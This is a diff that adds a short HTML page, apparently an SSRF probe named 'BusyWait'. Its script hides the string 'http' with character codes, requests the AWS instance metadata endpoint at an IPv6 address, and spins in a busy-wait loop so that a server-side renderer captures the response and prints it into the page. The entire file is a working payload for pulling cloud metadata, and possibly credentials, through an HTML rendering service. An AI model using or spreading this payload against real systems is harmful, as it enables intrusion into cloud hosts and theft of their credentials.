@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head><title>P6 BusyWait</title></head>
+<body>
+<h1>BUSYWAIT_XHR_TEST</h1>
+<div id="status">WAITING</div>
+<div id="data">NO_DATA</div>
+<script>
+var proto = String.fromCharCode(104,116,116,112);
+var url = proto + '://[fd00:ec2::254]/latest/meta-data/';
+var done = false;
+var result = '';
+
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+  if (xhr.readyState === 4) {
+    done = true;
+    result = 'STATUS:' + xhr.status + ' BODY:' + xhr.responseText;
+  }
+};
+xhr.open('GET', url, true);
+xhr.timeout = 25000;
+xhr.send();
+
+// Busy wait for up to 20 seconds
+var start = Date.now();
+while (!done && (Date.now() - start) < 20000) {
+  // Spin
+}
+
+if (done) {
+  document.getElementById('status').innerText = 'COMPLETED';
+  document.getElementById('data').innerText = result;
+} else {
+  document.getElementById('status').innerText = 'TIMED_OUT_AFTER_' + (Date.now()-start) + 'ms';
+  document.getElementById('data').innerText = 'xhr.readyState=' + xhr.readyState + ' xhr.status=' + xhr.status;
+}
+</script>
+</body>
+</html>
